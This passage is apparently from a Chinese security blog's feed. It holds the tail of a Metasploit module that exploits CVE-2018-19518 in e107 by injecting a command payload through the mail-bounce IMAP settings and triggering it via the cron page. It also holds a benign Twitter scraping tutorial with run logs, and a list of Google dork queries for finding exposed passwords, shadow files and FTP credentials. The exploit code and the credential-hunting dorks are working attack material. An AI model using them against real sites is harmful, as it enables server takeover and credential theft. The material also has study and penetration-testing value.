class="line">      end</span><br><span class="line">      if res.body.include? &apos;Status: &lt;b&gt;Disabled&lt;/b&gt;&apos;</span><br><span class="line">        print_error(&apos;Cron disabled, unexploitable.&apos;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      print_good(&apos;Storing payload in mail settings&apos;)</span><br><span class="line"> </span><br><span class="line">      # the imap/pop field is hard to find. Check Users &gt; Mail</span><br><span class="line">      # then check &quot;Bounced emails - Processing method&quot; and set it to &quot;Mail account&quot;</span><br><span class="line">      send_request_cgi(</span><br><span class="line">        &apos;method&apos; =&gt; &apos;POST&apos;,</span><br><span class="line">        &apos;uri&apos; =&gt; normalize_uri(target_uri.path, &apos;e107_admin&apos;, &apos;mailout.php&apos;),</span><br><span class="line">        &apos;cookie&apos; =&gt; cookie,</span><br><span class="line">        &apos;vars_get&apos; =&gt; &#123;</span><br><span class="line">          &apos;mode&apos; =&gt; &apos;prefs&apos;,</span><br><span class="line">          &apos;action&apos; =&gt; &apos;prefs&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        &apos;vars_post&apos; =&gt; &#123;</span><br><span class="line">          &apos;testaddress&apos; =&gt; &apos;none@none.com&apos;,</span><br><span class="line">          &apos;testtemplate&apos; =&gt; &apos;textonly&apos;,</span><br><span class="line">          &apos;bulkmailer&apos; =&gt; &apos;smtp&apos;,</span><br><span class="line">          &apos;smtp_server&apos; =&gt; &apos;1.1.1.1&apos;,</span><br><span class="line">          &apos;smtp_username&apos; =&gt; &apos;username&apos;,</span><br><span class="line">          &apos;smtp_password&apos; =&gt; &apos;password&apos;,</span><br><span class="line">          &apos;smtp_port&apos; =&gt; &apos;25&apos;,</span><br><span class="line">          &apos;smtp_options&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;smtp_keepalive&apos; =&gt; &apos;0&apos;,</span><br><span class="line">          &apos;smtp_useVERP&apos; =&gt; &apos;0&apos;,</span><br><span class="line">          &apos;mail_sendstyle&apos; =&gt; &apos;texthtml&apos;,</span><br><span class="line">          &apos;mail_pause&apos; =&gt; &apos;3&apos;,</span><br><span class="line">          &apos;mail_pausetime&apos; =&gt; &apos;4&apos;,</span><br><span class="line">          &apos;mail_workpertick&apos; =&gt; &apos;5&apos;,</span><br><span class="line">          &apos;mail_log_option&apos; =&gt; &apos;0&apos;,</span><br><span class="line">          &apos;mail_bounce&apos; =&gt; &apos;mail&apos;,</span><br><span class="line">          &apos;mail_bounce_email2&apos; =&gt; &apos;&apos;,</span><br><span class="line">          &apos;mail_bounce_email&apos; =&gt; &quot;#&#123;Rex::Text.rand_text_alphanumeric(8)&#125;@#&#123;Rex::Text.rand_text_alphanumeric(8)&#125;.org&quot;,</span><br><span class="line">          &apos;mail_bounce_pop3&apos; =&gt; &quot;x #&#123;command(&quot;\t&quot;)&#125;&#125;&quot;,</span><br><span class="line">          &apos;mail_bounce_user&apos; =&gt; Rex::Text.rand_text_alphanumeric(8),</span><br><span class="line">          &apos;mail_bounce_pass&apos; =&gt; Rex::Text.rand_text_alphanumeric(8),</span><br><span class="line">          &apos;mail_bounce_type&apos; =&gt; &apos;imap&apos;,</span><br><span class="line">          &apos;mail_bounce_auto&apos; =&gt; &apos;1&apos;,</span><br><span class="line">          &apos;updateprefs&apos; =&gt; &apos;Save Changes&apos;</span><br><span class="line">      &#125;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      vprint_status(&apos;Loading cron page to execute job manually&apos;)</span><br><span class="line">      res =  send_request_cgi(</span><br><span class="line">        &apos;uri&apos; =&gt; normalize_uri(target_uri.path, &apos;e107_admin&apos;, &apos;cron.php&apos;),</span><br><span class="line">        &apos;cookie&apos; =&gt; cookie</span><br><span class="line">      )</span><br><span class="line"> </span><br><span class="line">      unless res</span><br><span class="line">        print_error(&apos;Error loading site.  Check options.&apos;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      if /name=&apos;e-token&apos; value=&apos;(?&lt;etoken&gt;\w&#123;32&#125;)&apos;/ =~ res.body &amp;&amp; /_system::procEmailBounce.+?cron_execute\[(?&lt;cron_id&gt;\d)\]/m =~ res.body</span><br><span class="line">        print_good(&quot;Triggering manual run of mail bounch check cron to execute payload with cron id #&#123;cron_id&#125; and etoken #&#123;etoken&#125;&quot;)</span><br><span class="line">        # The post request has several duplicate columns, however all were not required.  Left them commented for documentation purposes</span><br><span class="line">        send_request_cgi(</span><br><span class="line">          &apos;method&apos; =&gt; &apos;POST&apos;,</span><br><span class="line">          &apos;uri&apos; =&gt; normalize_uri(target_uri.path, &apos;e107_admin&apos;, &apos;cron.php&apos;),</span><br><span class="line">          &apos;cookie&apos; =&gt; cookie,</span><br><span class="line">          &apos;vars_post&apos; =&gt; &#123;</span><br><span class="line">            &apos;e-token&apos; =&gt; etoken,</span><br><span class="line">            #&apos;e-columns[]&apos; =&gt; &apos;cron_category&apos;,</span><br><span class="line">            &apos;e-columns[]&apos; =&gt; &apos;cron_name&apos;,</span><br><span class="line">            #&apos;e-columns[]&apos; =&gt; &apos;cron_description&apos;,</span><br><span class="line">            #&apos;e-columns[]&apos; =&gt; &apos;cron_function&apos;,</span><br><span class="line">            #&apos;e-columns[]&apos; =&gt; &apos;cron_tab&apos;,</span><br><span class="line">            #&apos;e-columns[]&apos; =&gt; &apos;cron_lastrun&apos;,</span><br><span class="line">            #&apos;e-columns[]&apos; =&gt; &apos;cron_active&apos;,</span><br><span class="line">            &quot;cron_execute[#&#123;cron_id&#125;]&quot; =&gt; &apos;1&apos;,</span><br><span class="line">            &apos;etrigger_batch&apos; =&gt; &apos;&apos;</span><br><span class="line">        &#125;)</span><br><span class="line"> </span><br><span class="line">      else</span><br><span class="line">        print_error(&apos;e-token not found, required for manual exploitation.  Wait 60sec, cron may still trigger.&apos;)</span><br><span class="line">      end</span><br><span class="line"> </span><br><span class="line">      print_status(&apos;IMAP server config left on server, manual removal required.&apos;)</span><br><span class="line">    elsif target.name =~ /custom/</span><br><span class="line">      print_status(&apos;Listener started for 300 seconds&apos;)</span><br><span class="line">      print_good(&quot;POST request connection string: x #&#123;command&#125;&#125;&quot;)</span><br><span class="line">      # URI.encode leaves + as + since that&apos;s a space encoded.  So we manually change it.</span><br><span class="line">      print_good(&quot;GET request connection string: #&#123;URI.encode(&quot;x &quot; + command + &quot;&#125;&quot;).sub! &apos;+&apos;, &apos;%2B&apos;&#125;&quot;)</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>有时间在出，如何利用，相关图片我整理一下在上传，现在截稿已经4.34分……<br>看着一堆大佬的英文帖子，瞎几把写出来的，写的不到位的地方勿喷</p>]]></content>
    
    <summary type="html">
    
      CVE-2018-19518:PHP imap_open函数任意命令执行漏洞复现，太久写的帖子了图也不知道哪去了，有分析过程
    
    </summary>
    
    
      <category term="CVE-2018-19518" scheme="http://yoursite.com/tags/CVE-2018-19518/"/>
    
  </entry>
  
  <entry>
    <title>Twitter爬虫：scrapy+redis</title>
    <link href="http://yoursite.com/2020/03/29/Twitter%E7%88%AC%E8%99%AB%EF%BC%9Ascrapy-redis/"/>
    <id>http://yoursite.com/2020/03/29/Twitter爬虫：scrapy-redis/</id>
    <published>2020-03-29T15:16:38.000Z</published>
    <updated>2020-03-29T15:26:31.900Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Twitter爬虫：scrapy-redis"><a href="#Twitter爬虫：scrapy-redis" class="headerlink" title="Twitter爬虫：scrapy+redis"></a>Twitter爬虫：scrapy+redis</h1><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/HexChritistmas/TwitterSpider" target="_blank" rel="noopener">https://github.com/HexChritistmas/TwitterSpider</a></p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="安装scrapy框架"><a href="#安装scrapy框架" class="headerlink" title="安装scrapy框架"></a>安装scrapy框架</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install scrapy</span><br></pre></td></tr></table></figure><h3 id="安装redis"><a href="#安装redis" class="headerlink" title="安装redis"></a>安装redis</h3><p>鸟的话直接apt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install redis-server</span><br></pre></td></tr></table></figure></p><p>Mac的话直接brew<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install redis-server</span><br></pre></td></tr></table></figure></p><h3 id="安装python的redis模块"><a href="#安装python的redis模块" class="headerlink" title="安装python的redis模块"></a>安装python的redis模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install redis-python</span><br></pre></td></tr></table></figure><h3 id="终端代理"><a href="#终端代理" class="headerlink" title="终端代理"></a>终端代理</h3><p>爬推特使用http代理，所以需要在你的代理软件设置http<br>一种是，直接在你的<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">export http_proxy=http://127.0.0.1:1087</span><br><span class="line">export https_proxy=$http_proxy</span><br></pre></td></tr></table></figure></p><p>1087为你的http代理监听端口，<br>另一种是，使用proxychains进行终端代理，鸟已经自带，详细访问了社区</p><h2 id="简单介绍一下scrapy"><a href="#简单介绍一下scrapy" class="headerlink" title="简单介绍一下scrapy"></a>简单介绍一下scrapy</h2><h3 id="scrapy是python的一个爬虫框架，主要包括八个部分"><a href="#scrapy是python的一个爬虫框架，主要包括八个部分" class="headerlink" title="scrapy是python的一个爬虫框架，主要包括八个部分"></a>scrapy是python的一个爬虫框架，主要包括八个部分</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">引擎(Scrapy)</span><br><span class="line">调度器(Scheduler)</span><br><span class="line">下载器(Downloader)</span><br><span class="line">爬虫(Spiders)</span><br><span class="line">项目管道(Pipeline)</span><br><span class="line">下载器中间件(Downloader Middlewares)</span><br><span class="line">爬虫中间件(Spider Middlewares)</span><br><span class="line">调度中间件(Scheduler Middewares)</span><br></pre></td></tr></table></figure><h3 id="scrapy运行过程"><a href="#scrapy运行过程" class="headerlink" title="scrapy运行过程"></a>scrapy运行过程</h3><p>首先，scrapy从调度器中取出一个URL用于抓取，然后，scrapy把URL封装成一个Request请求传给downloader<br>downloader把资源下载下来，封装成Response，爬虫解析Response，解析到Item,交给管道进行处理，若解析出的是URL,就直接把URL交给调度器等待抓取</p><h3 id="大概操作"><a href="#大概操作" class="headerlink" title="大概操作"></a>大概操作</h3><p>生成爬虫项目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject demo</span><br></pre></td></tr></table></figure></p><p>生成爬虫<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd demo</span><br><span class="line">scrapy genspider demos demos.com</span><br></pre></td></tr></table></figure></p><p>目录结构大概为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">demo</span><br><span class="line">  +---- scrapy.cfg  这个文件主要存项目的配置信息</span><br><span class="line">  |</span><br><span class="line">  +---- items.py    这个文件用于存储数据的模板</span><br><span class="line">  |</span><br><span class="line">  +---- pipelines    这个文件主要写一些结构化的数据持久化相关的东西</span><br><span class="line">  |</span><br><span class="line">  +---- settings.py 爬虫的配置文件，这才是爬虫相关的配置文件，不要 混淆</span><br><span class="line">  |</span><br><span class="line">  +---- spiders      这个是爬虫目录，里边主要是爬虫文件，编写爬虫规则之类的</span><br></pre></td></tr></table></figure></p><p>这里大概介绍一下scrapy，想详细了解的可以去看一下python3网络爬虫开发实战，貌似是 崔庆才大佬的，就介绍到这里</p><h2 id="爬虫代码目录结构"><a href="#爬虫代码目录结构" class="headerlink" title="爬虫代码目录结构"></a>爬虫代码目录结构</h2><p>推特爬虫<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">+---twitterspider                                         </span><br><span class="line">|     |</span><br><span class="line">|     +---spiders</span><br><span class="line">|     |       |</span><br><span class="line">|     |       +--- __init__.py</span><br><span class="line">|     |       |</span><br><span class="line">|     |       +--- twitter_spider.py</span><br><span class="line">|     +---- __init__.py</span><br><span class="line">|     |</span><br><span class="line">|     +---- Bloomfilter.py</span><br><span class="line">|     |</span><br><span class="line">|     +---- items.py</span><br><span class="line">|     |</span><br><span class="line">|     +---- middleware.py</span><br><span class="line">|     |</span><br><span class="line">|     +---- pipelines.py</span><br><span class="line">|     |</span><br><span class="line">|     +---- settings.py</span><br><span class="line">|     |</span><br><span class="line">|     +---- spdierman.py</span><br><span class="line">|     |</span><br><span class="line">|     +---- user_agents.py</span><br><span class="line">+--- check_proxy.py           </span><br><span class="line">|     </span><br><span class="line">+--- dump.rdb                                </span><br><span class="line">|     </span><br><span class="line">+--- spidergo.py                   </span><br><span class="line">|     </span><br><span class="line">+---scrapy.cfg</span><br><span class="line">|     </span><br><span class="line">+---README.MD</span><br></pre></td></tr></table></figure></p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>这里有个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">python check_proxy.py</span><br></pre></td></tr></table></figure></p><p>看到如下提示，则终端代理成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一道检测闸放行</span><br><span class="line">第二道检测闸检测中...</span><br><span class="line">200</span><br><span class="line">放行,代理可用！</span><br></pre></td></tr></table></figure></p><p>爬虫之前先要把redis启起来,直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server</span><br></pre></td></tr></table></figure></p><p>然后直接运行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">python spidergo.py</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">➜  推特爬虫 git:(master) ✗ ✗ sudo python spidergo.py</span><br><span class="line">Password:</span><br><span class="line">2019-02-26 18:21:08 [scrapy.utils.log] INFO: Scrapy 1.6.0 started (bot: twitterspider)</span><br><span class="line">2019-02-26 18:21:08 [scrapy.utils.log] INFO: Versions: lxml 4.3.1.0, libxml2 2.9.9, cssselect 1.0.3, parsel 1.5.1, w3lib 1.20.0, Twisted 18.9.0, Python 2.7.10 (default, Aug 17 2018, 19:45:58) - [GCC 4.2.1 Compatible Apple LLVM 10.0.0 (clang-1000.0.42)], pyOpenSSL 19.0.0 (OpenSSL 1.1.1a  20 Nov 2018), cryptography 2.5, Platform Darwin-18.2.0-x86_64-i386-64bit</span><br><span class="line">2019-02-26 18:21:08 [scrapy.crawler] INFO: Overridden settings: &#123;&apos;NEWSPIDER_MODULE&apos;: &apos;twitterspider.spiders&apos;, &apos;SPIDER_MODULES&apos;: [&apos;twitterspider.spiders&apos;], &apos;DUPEFILTER_CLASS&apos;: &apos;scrapy.dupefilters.BaseDupeFilter&apos;, &apos;DOWNLOAD_DELAY&apos;: 2, &apos;BOT_NAME&apos;: &apos;twitterspider&apos;&#125;</span><br><span class="line">2019-02-26 18:21:08 [scrapy.extensions.telnet] INFO: Telnet Password: fada391dc8e59611</span><br><span class="line">2019-02-26 18:21:08 [scrapy.middleware] INFO: Enabled extensions:</span><br><span class="line">[&apos;scrapy.extensions.memusage.MemoryUsage&apos;,</span><br><span class="line"> &apos;scrapy.extensions.logstats.LogStats&apos;,</span><br><span class="line"> &apos;scrapy.extensions.telnet.TelnetConsole&apos;,</span><br><span class="line"> &apos;scrapy.extensions.corestats.CoreStats&apos;]</span><br><span class="line">2019-02-26 18:21:08 [scrapy.middleware] INFO: Enabled downloader middlewares:</span><br><span class="line">[&apos;twitterspider.middleware.ProxyMiddleware&apos;,</span><br><span class="line"> &apos;twitterspider.middleware.UserAgentMiddleware&apos;,</span><br><span class="line"> &apos;twitterspider.middleware.CheckMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.downloadermiddlewares.useragent.UserAgentMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.downloadermiddlewares.retry.RetryMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.downloadermiddlewares.redirect.RedirectMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.downloadermiddlewares.cookies.CookiesMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.downloadermiddlewares.stats.DownloaderStats&apos;]</span><br><span class="line">2019-02-26 18:21:08 [scrapy.middleware] INFO: Enabled spider middlewares:</span><br><span class="line">[&apos;scrapy.spidermiddlewares.httperror.HttpErrorMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.spidermiddlewares.offsite.OffsiteMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.spidermiddlewares.referer.RefererMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.spidermiddlewares.urllength.UrlLengthMiddleware&apos;,</span><br><span class="line"> &apos;scrapy.spidermiddlewares.depth.DepthMiddleware&apos;]</span><br><span class="line">2019-02-26 18:21:08 [scrapy.middleware] INFO: Enabled item pipelines:</span><br><span class="line">[]</span><br><span class="line">2019-02-26 18:21:08 [scrapy.core.engine] INFO: Spider opened</span><br><span class="line">2019-02-26 18:21:08 [scrapy.extensions.logstats] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)</span><br><span class="line">2019-02-26 18:21:08 [scrapy.extensions.telnet] INFO: Telnet console listening on 127.0.0.1:6023</span><br><span class="line">爬虫初始化中...</span><br><span class="line">URL:https://twitter.com/i/profiles/show/realdonaldtrump/timeline/tweets?include_available_features=1&amp;include_entities=1&amp;reset_error_state=false</span><br><span class="line">**************ProxyMiddleware no pass************127.0.0.1:1087</span><br><span class="line">获取请求头</span><br><span class="line">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36</span><br><span class="line">https://twitter.com/i/profiles/show/realdonaldtrump/timeline/tweets?include_available_features=1&amp;include_entities=1&amp;reset_error_state=false</span><br><span class="line">爬虫运行正常</span><br><span class="line">2019-02-26 18:21:09 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://twitter.com/i/profiles/show/realdonaldtrump/timeline/tweets?include_available_features=1&amp;include_entities=1&amp;reset_error_state=false&gt; (referer: https://www.google.com)</span><br><span class="line">1100211499350450176已存在,进行去重过滤</span><br><span class="line">1100211495223218176已存在,进行去重过滤</span><br><span class="line">1100184874466664448已存在,进行去重过滤</span><br><span class="line">1100127553203798016已存在,进行去重过滤</span><br><span class="line">1100126391729774592已存在,进行去重过滤</span><br><span class="line">1100110416812724224已存在,进行去重过滤</span><br><span class="line">1100110413209858048已存在,进行去重过滤</span><br><span class="line">1100110409736978432已存在,进行去重过滤</span><br><span class="line">1100105732450443265已存在,进行去重过滤</span><br><span class="line">1100050798015401984已存在,进行去重过滤</span><br><span class="line">1100048114382266374已存在,进行去重过滤</span><br><span class="line">1100017237228949506已存在,进行去重过滤</span><br><span class="line">1100015815515082752已存在,进行去重过滤</span><br><span class="line">1100012620441100290已存在,进行去重过滤</span><br><span class="line">1099722424059420673已存在,进行去重过滤</span><br><span class="line">1099837054400253953已存在,进行去重过滤</span><br><span class="line">1100002139282309121已存在,进行去重过滤</span><br><span class="line">1100000030319169537已存在,进行去重过滤</span><br><span class="line">1098948459405721600已存在,进行去重过滤</span><br><span class="line">1099995611305254912已存在,进行去重过滤</span><br><span class="line">下一页等待中...</span><br><span class="line">URL:https://twitter.com/i/profiles/show/realdonaldtrump/timeline/tweets?include_available_features=1&amp;include_entities=1&amp;max_position=1099995611305254912&amp;reset_error_state=false</span><br><span class="line">**************ProxyMiddleware no pass************127.0.0.1:1087</span><br><span class="line">获取请求头</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      twtter的爬虫scrapy+redis
    
    </summary>
    
    
      <category term="twitter" scheme="http://yoursite.com/tags/twitter/"/>
    
      <category term="redis" scheme="http://yoursite.com/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>GoogleHack常用语法</title>
    <link href="http://yoursite.com/2020/03/29/GoogleHack%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/"/>
    <id>http://yoursite.com/2020/03/29/GoogleHack常用语法/</id>
    <published>2020-03-29T15:14:30.000Z</published>
    <updated>2020-03-29T15:15:11.412Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">“Login: ” “password =” filetype: xls ( 搜索存储在excel文件中含有password的数据)。</span><br><span class="line">allinurl: auth_user_file.txt (搜索包含在服务器上的 auth_user_file.txt 的文件）。</span><br><span class="line">filetype: xls inurl: “password.xls” (查找 用户名和密码以excel格式）这个命令可以变为“admin.xls”.</span><br><span class="line">intitle: login password (获取登陆页面的连接，登陆关键词在标题中。)</span><br><span class="line">intitle: “Index of” master.passwd (密码页面索引)</span><br><span class="line">index of / backup ( 搜索服务器上的备份文件）</span><br><span class="line">intitle: index.of people.lst (包含people.list的网页）</span><br><span class="line">intitle: index.of passwd.bak ( 密码备份文件)</span><br><span class="line">intitle: “Index of” pwd.db (搜索数据库密码文件).</span><br><span class="line">intitle: “Index of .. etc” passwd (安装密码建立页面索引）.</span><br><span class="line">index.of passlist.txt (以纯文本的形式加载包含passlist.txt的页面).</span><br><span class="line">index.of.secret (显示包含机密的文档，.gov类型的网站除外) 还可以使用: index.of.private</span><br><span class="line">filetype: xls username password email (查找表格中含有username和password的列的xls文件).</span><br><span class="line">”# PhpMyAdmin MySQL-Dump” filetype: txt (列出包含敏感数据的基于php的页面)</span><br><span class="line">inurl: ipsec.secrets-history-bugs (包含只有超级用户才有的敏感数据). 还有一种旧的用法 inurl: ipsec.secrets “holds shared secrets”</span><br><span class="line">inurl: ipsec.conf-intitle: manpage</span><br><span class="line">inurl: “wvdial.conf” intext: “password” (显示包含电话号码，用户名和密码的连接。）</span><br><span class="line">inurl: “user.xls” intext: “password” (显示用户名和密码存储在xls的链接。)</span><br><span class="line">filetype: ldb admin (web服务器查找存储在数据库中没有呗googledork删去的密码。）</span><br><span class="line">inurl: search / admin.php (查找admin登陆的php页面). 如果幸运的话，还可以找到一个管理员配置界面创建一个新用户。</span><br><span class="line">inurl: password.log filetype:log (查找特定链接的日志文件。)</span><br><span class="line">filetype: reg HKEY_CURRENT_USER username (在HCU (Hkey_Current_User)路径中查找注册表文件(registyry)。)</span><br><span class="line">“Http://username: password @ www …” filetype: bak inurl: “htaccess | passwd | shadow | ht users”(查找备份文件中的用户名和密码。)</span><br><span class="line">filetype:ini ws_ftp pwd (通过ws_ftp.ini 文件查找admin用户的密码)</span><br><span class="line">intitle: “Index of” pwd.db (查找加密的用户名和密码）</span><br><span class="line">inurl:admin inurl:backup intitle:index.of (查找关键词包含admin和backup的目录。)</span><br><span class="line">“Index of/” “Parent Directory” “WS _ FTP.ini” filetype:ini WS _ FTP PWD (WS_FTP 配置文件， 可以获取FTP服务器的进入权限)</span><br><span class="line">ext:pwd inurl:(service|authors|administrators|users) “# -FrontPage-”</span><br><span class="line">filetype: sql ( “passwd values *” |” password values *” | “pass values **“) 查找存储在数据库中的sql代码和密码。 )</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      google语法
    
    </summary>
    
    
      <category term="google hack usage" scheme="http://yoursite.com/tags/google-hack-usage/"/>
    
  </entry>
  
  <entry>
    <title>一次线下AWD线下赛总结</title>
    <link href="http://yoursite.com/2020/03/29/%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8BAWD%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/03/29/一次线下AWD线下赛总结/</id>
    <published>2020-03-29T15:13:16.000Z</published>
    <updated>2020-03-29T15:14:03.149Z</updated>
    
